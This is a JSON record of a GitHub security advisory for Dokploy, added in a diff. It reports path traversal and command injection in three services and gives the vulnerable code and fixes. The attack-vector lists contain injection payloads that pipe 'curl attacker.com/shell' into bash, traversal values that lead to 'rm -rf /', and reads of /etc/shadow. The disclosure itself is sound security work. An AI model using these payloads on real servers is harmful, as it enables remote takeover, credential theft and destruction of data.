@@ -1,0 +1,44 @@
+{
+  "global": null,
+  "id": "GHSA-fgh8-p4fg-jc8h",
+  "repo": {
+    "cve_id": null,
+    "cvss_severities": {
+      "cvss_v3": {
+        "score": null,
+        "vector_string": null
+      },
+      "cvss_v4": {
+        "score": null,
+        "vector_string": null
+      }
+    },
+    "cwe_ids": [],
+    "description": "## Summary\n\nThree injection points in Dokploy's file management, patch repository, and scheduler services combine path traversal (CWE-22) with OS command injection (CWE-78). Two of these (VULN-012, VULN-015) also exploit a drizzle-zod v0.5.1 vulnerability where `$defaultFn()` fields are exposed as optional in insert schemas, allowing callers to supply arbitrary values.\n\n---\n\n## VULN-012 - Path Traversal + Command Injection via mount filePath → Arbitrary File Write + HOST RCE\n\n**File**: `packages/server/src/services/mount.ts`  \n**Lines**: 315-325 (`updateFileMount`), 336-341 (`deleteFileMount`)  \n**CWE**: CWE-22 + CWE-78 | **CVSS**: 8.5 - CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:C/C:H/I:H/A:H\n\n`mount.filePath` (`z.string().optional()`, no regex) is joined with a base path via `path.join()` and used unquoted in shell commands:\n\n```typescript\n// updateFileMount (lines 315-324)\nconst fullPath = path.join(basePath, mount.filePath);\nconst command = `echo \"${encodedContent}\" | base64 -d > ${fullPath}`;  // UNQUOTED after >\nawait execAsyncRemote(serverId, command);\n\n// deleteFileMount (lines 336-340)\nconst fullPath = path.join(basePath, mount.filePath);\nconst command = `rm -rf ${fullPath}`;  // COMPLETELY UNQUOTED\nawait execAsyncRemote(serverId, command);\n```\n\n`path.join()` resolves `..` sequences (enabling path traversal) but does NOT remove shell metacharacters.\n\n**Attack vectors:**\n- `filePath = \"../../../../etc/cron.d/evil\"` → arbitrary file write to `/etc/cron.d/evil` with attacker-controlled content (persistent RCE via cron)\n- `filePath = \"../../../../\"` → `rm -rf /` → destroys entire server filesystem\n- `filePath = \"file; curl attacker.com/shell | bash\"` → HOST RCE via `;` injection\n\n---\n\n## VULN-013 - Path Traversal + Command Injection via patch-repo filePath → Arbitrary File Read + RCE\n\n**File**: `packages/server/src/services/patch-repo.ts`  \n**Line**: 171 (`readPatchRepoFile`)  \n**CWE**: CWE-22 + CWE-78 | **CVSS**: 7.5 - CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H\n\n`filePath` from API request (`z.string()`, no restriction) is joined with a repo path and embedded in `cat \"${fullPath}\"` using double-quote context:\n\n```typescript\nconst repoPath = join(PATCH_REPOS_PATH, type, application.appName);\nconst fullPath = join(repoPath, filePath);\nconst command = `cat \"${fullPath}\"`;  // ← double-quote breakout + path traversal\n```\n\n- `filePath = \"../../../../etc/shadow\"` → reads `/etc/shadow` (path traversal)\n- `filePath = '\"; cat /etc/shadow; echo \"'` → shell injection → reads arbitrary file + RCE\n\n---\n\n## VULN-015 - drizzle-zod appName Leak + Path Traversal + Command Injection → rm -rf / + HOST RCE\n\n**File**: `packages/server/src/services/schedule.ts`  \n**Lines**: 100-108 (`deleteSchedule`), 152-170 (`handleScript`)  \n**Root cause**: `packages/server/src/db/schema/schedule.ts:29,81`  \n**CWE**: CWE-22 + CWE-78 | **CVSS**: 8.5 - CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:C/C:H/I:H/A:H\n\ndrizzle-zod v0.5.1 generates insert schemas with rule: `optional: (column) => !column.notNull || (column.notNull && column.hasDefault)`. `appName` has both `notNull=true` and `hasDefault=true` (via `$defaultFn`), so it becomes `z.string().optional()` - callers can override the auto-generated value.\n\n```typescript\n// db/schema/schedule.ts:29\nappName: text(\"appName\").notNull().$defaultFn(() => generateAppName(\"schedule\")),\n// createInsertSchema(schedules) → appName: z.string().optional()  ← user-supplied!\n\n// services/schedule.ts:102-103 (deleteSchedule)\nconst fullPath = path.join(SCHEDULES_PATH, schedule?.appName || \"\");\nconst command = `rm -rf ${fullPath}`;  // UNQUOTED\nawait execAsync(command);\n\n// services/schedule.ts:159-164 (handleScript)\nconst script = `mkdir -p ${fullPath}\n...`;\nawait execAsyncRemote(schedule?.serverId || \"\", script);\n```\n\n**Attack vectors:**\n- `appName = \"../../../../\"` → `path.join` → `\"/\"` → `rm -rf /` → filesystem destruction\n- `appName = \"; curl attacker.com/shell | bash #\"` → HOST RCE\n- Same drizzle-zod root cause as VULN-006 (`certificatePath`)\n\n**Note**: This is the second instance of the drizzle-zod `$defaultFn` exposure pattern. All `createInsertSchema()` calls in Dokploy should be audited for fields with `$defaultFn()` that are used in shell commands.\n\n---\n\n## Recommended Fixes\n\n```typescript\n// VULN-012: shell-quote + boundary check\nconst resolvedPath = path.join(basePath, mount.filePath);\nif (!resolvedPath.startsWith(basePath + path.sep)) throw new Error(\"Path traversal\");\nconst command = `echo \"${encodedContent}\" | base64 -d > ${quote([resolvedPath])}`;\nconst rmCommand = `rm -rf ${quote([resolvedPath])}`;\n\n// VULN-013: shell-quote + boundary check\nconst fullPath = join(repoPath, filePath);\nif (!fullPath.startsWith(repoPath + path.sep)) throw new TRPCError({ code: \"FORBIDDEN\" });\nconst command = `cat ${quote([fullPath])}`;\n\n// VULN-015: omit appName from insert schema\nexport const createScheduleSchema = createInsertSchema(schedules).omit({ appName: true });\n// Also quote in deleteSchedule/handleScript:\nconst command = `rm -rf ${quote([fullPath])}`;\n```\n\n## Verification\n\nConfirmed via static analysis on Dokploy v0.29.8. The drizzle-zod `$defaultFn` → `optional()` behavior was independently verified by reading drizzle-zod v0.5.1 source at `src/schema.ts:84`.",
+    "ghsa_id": "GHSA-fgh8-p4fg-jc8h",
+    "html_url": "https://github.com/Dokploy/dokploy/security/advisories/GHSA-fgh8-p4fg-jc8h",
+    "identifiers": [
+      {
+        "type": "GHSA",
+        "value": "GHSA-fgh8-p4fg-jc8h"
+      }
+    ],
+    "published_at": "2026-11-12T08:16:59Z",
+    "references": [],
+    "severity": "high",
+    "summary": "Path Traversal + OS Command Injection in mount/patch-repo/schedule services → rm -rf / + HOST RCE",
+    "updated_at": "2026-11-12T08:16:59Z",
+    "vulnerabilities": [
+      {
+        "package": {
+          "ecosystem": "other",
+          "name": "dokploy"
+        },
+        "patched_versions": "0.31.1",
+        "vulnerable_version_range": "< 0.31.1"
+      }
+    ],
+    "withdrawn_at": null
+  },
+  "repository": "Dokploy/dokploy"
+}
